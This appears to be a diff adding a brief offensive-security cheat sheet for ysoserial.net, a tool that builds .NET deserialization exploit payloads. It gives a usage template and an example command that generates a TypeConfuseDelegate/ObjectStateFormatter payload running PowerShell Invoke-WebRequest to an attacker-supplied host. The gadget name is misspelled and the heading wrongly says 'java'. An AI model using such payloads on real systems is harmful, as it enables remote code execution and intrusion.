@@ -1,0 +1,15 @@
+# ------------------------------- start ysoserial ------------------------------- #
+    # ------ Introduction:
+        - ysoserial.net is a collection of utilities and property-oriented programming "gadget chains" discovered in common .NET libraries that can, under    
+        the right conditions, exploit .NET applications performing unsafe deserialization of objects.
+# -------------------------------   end ysoserial ------------------------------- #
+
+
+# ------------------------------- start usage ------------------------------- #
+    # ----- help
+        ysoserial.exe -h
+
+    # ----- java serialize payload
+        ysoserial.exe -o <output_format> -g <gadget_chain> -f <serialization_method> -c "<payload>"
+        ex: ysoserial.exe -o base64 -g TypeConfuseDelefate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri <your_host:port>"
+# -------------------------------   end usage ------------------------------- #
